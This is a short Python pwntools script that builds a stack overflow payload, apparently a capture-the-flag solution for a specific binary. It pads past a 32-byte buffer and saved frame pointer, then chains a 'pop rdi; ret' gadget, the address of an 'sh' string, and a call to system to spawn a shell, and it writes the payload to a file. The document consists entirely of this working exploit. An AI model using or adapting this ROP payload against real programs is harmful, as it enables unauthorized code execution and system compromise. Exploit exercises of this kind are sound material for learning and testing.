from pwn import *

buflen = 32

target_addr = p64(0x4006c6)

payload = ""
payload += "A" * buflen
payload += "A" * 8
payload += p64(0x4007b3) # pop rdi; ret
payload += p64(0x4003bf) # sh str
payload += p64(0x4006cf) # call system

print len(payload) <= 64

open("payload", "wt").write(payload)
